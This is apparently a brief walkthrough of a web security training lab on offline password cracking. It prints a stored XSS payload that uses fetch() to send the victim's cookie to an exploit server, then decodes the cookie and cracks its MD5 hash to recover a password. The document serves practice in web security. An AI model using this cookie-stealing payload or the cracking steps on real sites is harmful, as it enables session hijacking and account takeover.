Title: Offline password cracking
Level: PRACTITIONER
Desc:  This lab stores the user's password hash in a cookie. The lab also contains an XSS vulnerability in the comment functionality. To solve the lab, obtain Carlos's stay-logged-in cookie and use it to crack his password. Then, log in as carlos and delete his account from the "My account" page.

    Your credentials: wiener:peter
    Victim's username: carlos

# Walkthrough:
We have XSS in comment field, basic payload works.

My code to attack victim: 
`<script>fetch("https://exploit-0a93003704fadc6f8113dd9401cf00e6.exploit-server.net/log?cookie=" + document.cookie);</script>`

<img width="1859" height="159" alt="image" src="https://github.com/user-attachments/assets/145c9263-d776-40c5-9ac4-ac16ff5641bc" />

cookie to break: Y2FybG9zOjI2MzIzYzE2ZDVmNGRhYmZmM2JiMTM2ZjI0NjBhOTQz

base64 decode: carlos:26323c16d5f4dabff3bb136f2460a943

breaking the md5 hash:

26323c16d5f4dabff3bb136f2460a943

After pasting this md5 into google search we get password.
onceuponatime
